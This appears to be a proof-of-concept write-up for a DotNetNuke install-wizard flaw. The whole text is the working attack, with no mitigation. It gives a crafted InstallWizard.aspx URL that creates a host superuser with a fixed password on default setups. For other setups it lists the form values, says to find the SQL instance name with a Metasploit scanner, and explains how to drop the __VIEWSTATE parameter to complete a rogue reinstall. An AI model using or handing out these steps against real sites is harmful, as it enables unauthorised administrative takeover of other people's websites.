The exploit can be demonstrated as follows:
 
If the DNN SQL database is in the default location and configuration:
    - Database Type: SQL Server Express File
    - Server Name: .\SQLExpress
    - Filename: Database.mdf (This is the default database file of DNN. You can find it at \App_Data\Database.mdf)
 
The following URL will create an account with the username: 'host', password: 'dnnhost':
    http://www.example.com/Install/InstallWizard.aspx?__VIEWSTATE=&culture=en-US&executeinstall
 
 
If the DNN SQL database is not in the default configuration then the attacker must know its configuration or be able to brute-force guess it.
 
    A. Visit http://www.example.com/Install/InstallWizard.aspx?__VIEWSTATE=
    B. Fill in the form and submit it:
        Username: whatever
        Password: whateverpassword
        Email address: whatever@example.com (You will get an error msg due to client-side validation, just ignore it)
        Website Name: Whatever Site Name
        Database Setup Custom:
            - Database Type: SQL Server Express File
            - Server Name: .\SQLExpress 
                - This is the SQL Server instance name that we need to find or brute-force guess it in order to complete the installation. 
                - If MSSQL database is accessible you can use auxiliary/scanner/mssql/mssql_ping from MSF to get it.
            - Filename: Database.mdf
                - This is the default database file of DNN. You can find it at "\App_Data\Database.mdf".
            - Tick the box Run Database as a Database Owner
    C. You will probably get an error. Remove the "__VIEWSTATE=" parameter from the URL and press enter.
    D. When the installation completes click Visit Website.
    E. Login with your credentials.
